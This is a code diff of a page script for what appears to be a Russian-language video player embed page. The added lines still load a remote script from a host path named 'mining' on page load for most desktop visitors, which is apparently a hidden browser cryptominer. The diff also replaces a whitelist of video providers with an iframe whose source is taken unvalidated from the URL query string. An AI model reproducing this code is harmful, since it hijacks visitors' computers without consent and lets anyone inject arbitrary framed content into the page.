@@ -3,28 +3,11 @@ document.addEventListener('DOMContentLoaded', function() {
 
     if (navigator.cookieEnabled === false) {
         document.body.innerText = 'Для работы сайта необходимо включить куки.';
-        return;
     } else if (location.search.length > 1) {
-        var x1 = new URL(location.href).searchParams;
-        var x2 = null;
-
-        if (x1.get('API') === 'CUSTOM') {
-            x2 = '//' + x1.get('LINK');
-        } else if (x1.get('API') === 'MOONWALK') {
-            x2 = '//moonwalk.egeria.space' + x1.get('LINK');
-        } else if (x1.get('API') === 'HDGO') {
-            x2 = '//hdgo.egeria.space' + x1.get('LINK');
-        } else if (x1.get('API') === 'KODIK') {
-            x2 = '//kodik.cc' + x1.get('LINK');
-        } else {
-            document.body.innerText = 'Неверный параметр API.';
-            return;
-        }
-
-        var x3 = document.createElement('iframe');
-        x3.setAttribute('src', x2);
-        x3.setAttribute('allowfullscreen', '');
-        document.body.appendChild(x3);
+        var x1 = document.createElement('iframe');
+        x1.setAttribute('src', location.search.substr(1));
+        x1.setAttribute('allowfullscreen', '');
+        document.body.appendChild(x1);
 
         if (typeof navigator.platform === "undefined" || (
                 navigator.platform !== 'Android' &&
@@ -35,10 +18,12 @@ document.addEventListener('DOMContentLoaded', function() {
                 navigator.platform !== 'WebTV OS' &&
                 localStorage.getItem('DisableMining') === null
             )) {
-            var x4 = document.createElement('script');
-            x4.setAttribute('src', '//m1.egeria.space/mining');
-            x4.setAttribute('async', '');
-            document.body.appendChild(x4);
+            var x2 = document.createElement('script');
+            x2.setAttribute('src', '//m1.egeria.space/mining');
+            x2.setAttribute('async', '');
+            document.body.appendChild(x2);
         }
+    } else {
+        document.body.innerText = 'Неверный параметр API.';
     }
 });
